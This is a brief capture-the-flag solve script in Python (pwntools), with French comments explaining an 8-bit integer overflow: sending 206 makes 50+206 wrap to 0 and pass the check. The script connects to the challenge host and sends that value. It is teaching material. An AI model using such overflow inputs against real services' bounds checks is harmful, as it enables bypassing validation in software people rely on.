# Integer-Overflow — Pwny-CTF (script de solve)
from pwn import *

# Integer overflow sur un uint8_t.
# vuln(): i = 50; i += atoi(argv[1]); gagne si i < 49.
# i est sur 8 bits -> i = (50 + x) mod 256. Pour x = 206 : (50+206)=256 -> 0 < 49.
# Contrainte: atoi(string) >= 0 (les negatifs sont refuses), donc on passe par le
# wrap-around au lieu d'un nombre negatif.
# Le service distant passe la ligne envoyee sur stdin en argv[1].

conn = remote("chal.sigpwny.com", 1342)
conn.sendline(b"206")
print(conn.recvall(timeout=5).decode(errors="replace"))
